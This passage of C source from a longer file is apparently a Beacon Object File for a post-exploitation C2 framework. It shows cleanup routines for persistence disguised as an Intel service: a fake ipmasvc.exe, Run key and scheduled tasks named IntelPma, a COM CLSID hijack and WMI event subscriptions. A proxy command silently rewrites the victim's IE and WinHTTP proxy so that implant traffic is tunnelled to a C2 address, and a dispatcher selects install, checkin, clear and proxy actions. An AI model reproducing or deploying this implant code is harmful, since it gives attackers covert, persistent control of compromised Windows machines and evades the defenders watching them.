        KERNEL32$RemoveDirectoryA(p);
    }
    if (KERNEL32$GetEnvironmentVariableA("ProgramData", pd, MAX_PATH)) {
        MSVCRT$_snprintf(p, MAX_PATH, "%s\\Intel\\Ipma\\ipmasvc.exe", pd);
        zap_file(p);
        MSVCRT$_snprintf(p, MAX_PATH, "%s\\Intel\\Ipma", pd);
        KERNEL32$SetFileAttributesA(p, 0x80);
        KERNEL32$RemoveDirectoryA(p);
    }
    if (ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, REG_KEY, 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) == ERROR_SUCCESS && hk) {
        ADVAPI32$RegDeleteValueA(hk, REG_VAL);
        ADVAPI32$RegCloseKey(hk);
        ADVAPI32$RegDeleteKeyA(HKEY_LOCAL_MACHINE, REG_KEY);
        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] dropped HKLM\\%s\n", REG_KEY);
    }
    MSVCRT$_snprintf(cmd, sizeof(cmd), "C:\\Windows\\System32\\netsh.exe advfirewall firewall delete rule name=RiptideWG-51820");
    run_hidden(cmd);
    if (ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) == ERROR_SUCCESS && hk) {
        ADVAPI32$RegDeleteValueA(hk, "IntelPma");
        ADVAPI32$RegCloseKey(hk);
        hk = NULL;
    }
    run_hidden("C:\\Windows\\System32\\schtasks.exe /delete /tn IntelPma /f");
    run_hidden("C:\\Windows\\System32\\schtasks.exe /delete /tn IntelPmaCOM /f");
    ADVAPI32$RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\CLSID\\{8B4E3D9A-6C2F-4A11-9D4E-B7C1A2E3F405}\\LocalServer32");
    ADVAPI32$RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\CLSID\\{8B4E3D9A-6C2F-4A11-9D4E-B7C1A2E3F405}");
    run_hidden(
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \""
        "$n='IntelPma'; $ns='root\\subscription'; "
        "Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA 0 | ? { $_.Filter -match $n } | %% { $_.Delete() }; "
        "Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -EA 0 | ? { $_.Name -eq $n } | %% { $_.Delete() }; "
        "Get-WmiObject -Namespace $ns -Class __EventFilter -EA 0 | ? { $_.Name -eq $n } | %% { $_.Delete() }\"");
    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] clear done\n");
}

static void cmd_proxy(const char *host, const char *port)
{
    char proxy[128];
    char cmd[640];
    HKEY hk = NULL;
    DWORD one = 1;
    const char *bypass = "localhost;127.0.0.1;<local>";

    if (!nonempty(host))
        host = "127.0.0.1";
    if (!nonempty(port))
        port = "8080";
    MSVCRT$_snprintf(proxy, sizeof(proxy), "%s:%s", host, port);

    if (ADVAPI32$RegCreateKeyExA(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
            0, NULL, 0, KEY_SET_VALUE | KEY_CREATE_SUB_KEY, NULL, &hk, NULL) == ERROR_SUCCESS &&
        hk) {
        ADVAPI32$RegSetValueExA(hk, "ProxyEnable", 0, REG_DWORD, (const BYTE *)&one, 4);
        ADVAPI32$RegSetValueExA(hk, "ProxyServer", 0, REG_SZ, (const BYTE *)proxy, (DWORD)MSVCRT$strlen(proxy) + 1);
        ADVAPI32$RegSetValueExA(hk, "ProxyOverride", 0, REG_SZ, (const BYTE *)bypass, (DWORD)MSVCRT$strlen(bypass) + 1);
        ADVAPI32$RegCloseKey(hk);
    }
    MSVCRT$_snprintf(
        cmd, sizeof(cmd),
        "C:\\Windows\\System32\\netsh.exe winhttp set proxy proxy-server=%s bypass-list=localhost;127.0.0.1",
        proxy);
    run_hidden(cmd);
    BeaconPrintf(
        CALLBACK_OUTPUT,
        "[mesh] proxy %s  (Demon WinHTTP + IE). riptide HTTP CONNECT splices C2 to 10.66.0.1:443. existing session picks it up on reconnect.\n",
        proxy);
}

void go(char *args, int len)
{
    datap parser;
    char *cmd;
    char *role;
    char *methods;
    char *exe;
    char *conf;
    char *svc;
    int hub;

    BeaconDataParse(&parser, args, len);
    cmd = BeaconDataExtract(&parser, NULL);
    role = BeaconDataExtract(&parser, NULL);
    methods = BeaconDataExtract(&parser, NULL);
    exe = BeaconDataExtract(&parser, NULL);
    conf = BeaconDataExtract(&parser, NULL);
    svc = BeaconDataExtract(&parser, NULL);
    if (!nonempty(cmd))
        cmd = "install";

    if (MSVCRT$_stricmp(cmd, "ram") == 0)
        cmd_ram(role, methods); /* packed as ram, exe, conf, ... */
    else if (MSVCRT$_stricmp(cmd, "checkin") == 0)
        cmd_checkin();
    else if (MSVCRT$_stricmp(cmd, "clear") == 0)
        cmd_clear(role);
    else if (MSVCRT$_stricmp(cmd, "proxy") == 0)
        cmd_proxy(role, methods);
    else {
        /* install: role=client|hub, methods=svc,onlogon,... exe conf svc
           ram-compat: if role looks like a path, treat as old 3-arg install */
        if (nonempty(role) && (role[1] == ':' || role[0] == '\\')) {
            cmd_install(role, methods, exe, 0, "");
            return;
        }
        hub = nonempty(role) && MSVCRT$_stricmp(role, "hub") == 0;
        cmd_install(exe, conf, svc, hub, methods);
    }
}
